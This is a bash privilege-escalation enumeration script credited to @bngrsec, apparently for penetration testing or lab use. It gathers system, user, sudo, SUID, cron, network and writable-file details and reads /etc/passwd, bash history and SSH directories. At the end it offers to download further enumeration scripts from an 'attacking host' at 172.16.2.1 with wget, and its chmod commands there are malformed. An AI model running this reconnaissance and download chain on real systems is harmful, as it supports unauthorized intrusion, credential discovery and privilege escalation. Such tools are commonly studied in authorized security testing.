#!/bin/bash

echo ""
echo "----------------------------------------"
echo "| Linux Enumeration Script by @bngrsec |"
echo "----------------------------------------"
echo ""

#host information
echo "-----HOST INFORMATION-----"
hostname
echo ""
uname -a
echo ""
cat /etc/issue
cat /proc/version
echo ""

echo "-----ARCH-----"
uname -i
echo ""

#user information
echo "-----USER INFO-----"
whoami
id
echo ""

echo "-----ENV INFO-----"
env
echo ""

#this might need a passwd
echo "-----WHAT CAN WE RUN AS SUDO?-----"
sudo -l
echo ""

echo "-----USERS ON BOX-----"
ls -la /home/
echo ""
cat /etc/passwd
echo ""
w
echo ""

#find suid executables
echo "-----SUID EXECUTABLES-----"
find /* -user root -perm -4000 -print 2>/dev/null
echo ""

#might be helpful to run this without looking for root processes aswell
echo "-----RUNNING PROCESSES AS ROOT-----"
ps aux | grep root
echo ""

echo "-----NETWORK INFO-----"
route
echo ""
netstat -antup
echo ""

#write applications to text file, because the output is usually huge
echo "-----INSTALLED APPLICATIONS-----"
dpkg -l > /tmp/packages.txt
echo "Applications written to text file at /tmp/packages.txt"
echo ""

#world writable directories
echo "-----WORLD WRITABLE DIRECTORIES-----"
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
echo ""

#world writable directories for root
echo "-----WORLD WRITABLE DIRECTORIES FOR ROOT-----"
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
echo ""

#world writable files
echo "-----WORLD WRITABLE FILES-----"
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
echo ""

#cronjob information
echo "-----CRON INFORMATION-----"
ls -la /etc/cron*
echo ""

#writable files in /etc/:
echo "-----WRITABLE FILES IN /ETC/-----"
find /etc -perm -2 -type f 2>/dev/null
echo ""

#permissions for passwd and shadow
echo "-----PASSWD/SHADOW PERMISSIONS-----"
ls -la /etc/ | grep passwd
ls -la /etc/ | grep shadow
echo ""

echo "~The following are stretches, but could be useful if found~"

#list configuration files in /etc/:
echo "-----CONFIGURATION FILES IN /ETC/-----"
ls -la /etc/ | grep .conf
echo ""

#list backups in /var/backups
echo "-----BACKUPS-----"
ls -la /var/backups/
echo ""

#current user bash history
echo "-----BASH HISTORY-----"
ls -la ~/.bash_history
echo ""
cat ~/.bash_history
echo ""

#ssh folders to check
echo "-----SSH INFO-----"
ls -la /etc/ | grep ssh
ls -la ~/.ssh/
echo ""

#if the machine is hosting a webpage, sometimes this is useful
echo "-----WEB FILES-----"
ls -la /var/www/html
echo ""

echo "-----UNMOUNTED FILE SYSTEMS-----"
cat /etc/fstab
echo ""

#obviously will only work if host http server is up
#let's grab the other scripts if we need more enumeration
#choose if you want to grab more files
echo "Initial enumeration has completed."
echo "Would you like to grab more enum-scripts from your attacking host? [y/n]"
read varname
if [[ "$varname" = "y" ]]; then
  wget -O linenum.sh http://172.16.2.1/linenum.sh | chmod linenum.sh 755 & wget -O privchecker.py http://172.16.2.1/linuxprivchecker.py | chmod privchecker.py 755
else
  echo "Ok. Skipping."
fi
echo ""
